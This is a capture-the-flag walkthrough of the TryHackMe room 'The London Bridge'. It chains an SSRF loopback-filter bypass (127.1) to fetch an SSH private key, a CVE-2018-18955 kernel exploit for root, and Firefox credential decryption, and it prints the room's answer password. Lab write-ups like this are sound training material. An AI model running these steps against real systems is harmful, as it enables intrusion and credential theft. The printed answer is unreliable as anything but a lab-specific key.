# TryHackMe — The London Bridge

**Difficulty:** Medium

## 1. Reconnaissance

I started with an Nmap scan to identify the exposed services:

```bash
nmap -sC -sV -p- TARGET_IP
```

The scan revealed two interesting open ports:

- **22/tcp** — SSH
- **8080/tcp** — HTTP

I opened the web application on port 8080 and started enumerating its directories using Gobuster:

```bash
gobuster dir -u http://TARGET_IP:8080 \
-w /usr/share/wordlists/dirb/common.txt
```

Some discovered endpoints included:

- `/contact`
- `/feedback`
- `/gallery`
- `/upload`

However, the interesting endpoint was not found with the initial wordlist.

After switching to a larger wordlist, I discovered:

```text
/dejaview
```

## 2. Discovering the SSRF vulnerability

While exploring the application, I identified an endpoint called `/view_image`.

The endpoint accepted a URL through a POST parameter named `www`. This suggested that the server was fetching external resources on behalf of the user.

I used FFUF to enumerate possible internal paths:

```bash
ffuf -u 'http://TARGET_IP:8080/view_image' \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-H 'Content-Type: application/x-www-form-urlencoded' \
-X POST \
-d 'www=http://127.1/FUZZ' \
-mc all -t 50 -ic -fs 469
```

The use of `127.1` was important because it provided an alternative representation of the loopback address and bypassed the application's filtering.

The enumeration revealed an accessible `.ssh` directory.

## 3. Retrieving the SSH private key

Since the internal `.ssh` directory was accessible through the SSRF vulnerability, I attempted to retrieve Beth's private key:

```bash
curl -s 'http://TARGET_IP:8080/view_image' \
-d 'www=http://127.1/.ssh/id_rsa' \
-o id_rsa
```

I also checked the `authorized_keys` file to identify the corresponding username.

After retrieving the key, I changed its permissions:

```bash
chmod 600 id_rsa
```

Then connected through SSH:

```bash
ssh -i id_rsa beth@TARGET_IP
```

This provided an initial foothold as **beth**.

## 4. Privilege Escalation — CVE-2018-18955

After gaining access, I started enumerating the system.

First, I checked the operating system and kernel version:

```bash
uname -a
cat /etc/os-release
```

The machine was running Ubuntu 18.04.5 LTS with the following kernel:

```text
4.15.0-112-generic
```

I also enumerated SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

The system had a vulnerable kernel configuration associated with **CVE-2018-18955**, a Linux kernel privilege escalation vulnerability involving user namespaces.

I used the following exploit repository:

https://github.com/scheatkode/CVE-2018-18955

The required files were transferred to the target machine:

```text
exploit.dbus.sh
rootshell.c
subshell.c
subuid_shell.c
```

After placing the files in `/tmp/exp`, I made the exploit executable:

```bash
chmod +x exploit.dbus.sh
```

Then executed it:

```bash
./exploit.dbus.sh
```

The exploit successfully created a SUID root shell.

I verified the privileges:

```bash
id
```

The result confirmed root access:

```text
uid=0(root) gid=0(root)
```

I could now access the root directory and retrieve the root flag:

```bash
cat /root/root.txt
```

## 5. Recovering Charles's Password

The next objective was to recover Charles's password.

I first checked the system account:

```bash
cat /etc/passwd | grep charles
```

The output revealed:

```text
charles:x:1001:1001:King Charles,,,:/home/charles:/bin/bash
```

I inspected `/etc/shadow` and found Charles's password hash.

The hash used the SHA-512 crypt format (`$6$`). Although it was possible to attempt offline password cracking with John the Ripper, the machine also contained Firefox profile data belonging to Charles.

Firefox stores saved login information in files such as:

- `logins.json` — saved login entries
- `key4.db` — encryption key database

The profile was located under:

```text
/home/charles/.mozilla/firefox/8k3bf3zp.charles
```

By extracting the Firefox profile and using `firefox_decrypt`, I was able to recover the saved credentials.

**Charles's password:**

```text
thekingofengland
```

## Conclusion

This room covered several useful penetration testing techniques:

- Network and directory enumeration
- Server-Side Request Forgery (SSRF)
- Accessing internal resources through loopback addresses
- Retrieving SSH private keys
- Linux kernel privilege escalation
- SUID binary enumeration
- Extracting saved credentials from Firefox profiles

The most interesting part was chaining the SSRF vulnerability into SSH access and then using a kernel privilege escalation vulnerability to obtain root access.
